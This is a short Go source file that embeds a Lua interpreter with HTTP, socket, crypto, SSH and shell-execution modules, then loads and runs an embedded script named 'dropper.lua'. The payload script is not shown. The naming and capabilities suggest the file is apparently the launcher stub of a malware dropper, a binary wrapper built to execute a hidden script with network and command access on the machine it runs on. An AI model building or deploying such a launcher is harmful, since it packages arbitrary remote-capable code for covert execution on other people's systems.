package main

import (
	"net/http"

	"github.com/cjoudrey/gluahttp"
	"github.com/cyian-1756/gluacrypto"
	"github.com/cyian-1756/gluassh"
	"github.com/nubix-io/gluasocket"
	"github.com/otm/gluash"
	lua "github.com/yuin/gopher-lua"
	luajson "layeh.com/gopher-json"
)

var luaCodeToRun string

func main() {
	L := lua.NewState()
	defer L.Close()

	L.PreloadModule("http", gluahttp.NewHttpModule(&http.Client{}).Loader)
	gluasocket.Preload(L)
	gluacrypto.Preload(L)
	L.PreloadModule("ssh", gluassh.Loader)
	luajson.Preload(L)
	L.PreloadModule("sh", gluash.Loader)
	data, err := Asset("dropper.lua")
	if err != nil {
		// Asset was not found.
	}

	if err := L.DoString(string(data)); err != nil {
		panic(err)
	}
}
